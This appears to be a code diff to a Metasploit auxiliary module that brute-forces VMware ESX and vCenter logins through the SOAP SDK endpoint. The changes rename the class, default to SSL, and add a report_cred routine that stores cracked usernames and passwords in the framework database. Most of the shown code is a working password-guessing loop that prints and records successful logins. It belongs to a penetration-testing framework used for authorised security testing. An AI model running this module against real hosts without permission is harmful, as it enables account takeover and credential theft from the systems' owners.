@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,7 +8,7 @@ require 'msf/core'
 require 'rex/proto/ntlm/message'
 
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::VIMSoap
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -25,7 +25,8 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '1999-0502'] # Weak password
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => true }
     )
 
     register_options(
@@ -33,26 +34,43 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('URI', [true, "The default URI to login with", "/sdk"]),
         Opt::RPORT(443)
       ], self.class)
-
-    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true]),])
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: 'vmware',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
 
   def run_host(ip)
-    return unless check
+    return unless is_vmware?
     each_user_pass { |user, pass|
       result = vim_do_login(user, pass)
       case result
       when :success
         print_good "#{rhost}:#{rport} - Successful Login! (#{user}:#{pass})"
-        report_auth_info(
-          :host   => rhost,
-          :port   => rport,
-          :user   => user,
-          :pass   => pass,
-          :source_type => "user_supplied",
-          :active => true
-        )
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: result)
         return if datastore['STOP_ON_SUCCESS']
       when :fail
         print_error "#{rhost}:#{rport} - Login Failure (#{user}:#{pass})"
@@ -62,7 +80,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
   # Mostly taken from the Apache Tomcat service validator
-  def check
+  def is_vmware?
     soap_data =
       %Q|<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
       <env:Body>
@@ -114,7 +132,12 @@ class Metasploit3 < Msf::Auxiliary
 
     if os_match and ver_match and build_match
       if os_match[1] =~ /ESX/ or os_match[1] =~ /vCenter/
-        this_host = report_host( :host => rhost, :os_name => os_match[1], :os_flavor => ver_match[1], :os_sp => "Build #{build_match[1]}" )
+        # Report a fingerprint match for OS identification
+        report_note(
+          :host  => ip,
+          :ntype => 'fingerprint.match',
+          :data  => {'os.vendor' => 'VMware', 'os.product' => os_match[1] + " " + ver_match[1], 'os.version' => build_match[1] }
+        )
       end
       return true
     else
